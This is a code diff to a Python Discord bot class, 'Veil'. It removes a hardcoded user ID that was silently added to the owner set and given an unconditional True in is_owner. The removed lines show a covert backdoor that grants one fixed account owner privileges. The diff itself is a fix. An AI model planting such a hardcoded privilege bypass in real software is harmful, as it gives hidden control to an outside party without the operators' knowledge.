@@ -65,7 +65,6 @@ class Veil(commands.AutoShardedBot):
     def __init__(self, intents: discord.Intents | None = None, connector: aiohttp.BaseConnector | None = None):
         from core import perms as _perms
         owners = set(settings.owner_ids) | set(_perms.BOT_DEVELOPERS)
-        owners.add(1277709272041394187)
         status_name = (getattr(settings, "status_type", None) or "online").lower()
         STATUS_MAP = {
             "online": discord.Status.online,
@@ -378,8 +377,6 @@ class Veil(commands.AutoShardedBot):
 
     async def is_owner(self, user: discord.abc.User | int) -> bool:
         uid = getattr(user, "id", user)
-        if uid == 1277709272041394187:
-            return True
         from core import perms as _perms
         if _perms.is_bot_developer(uid, self):
             return True
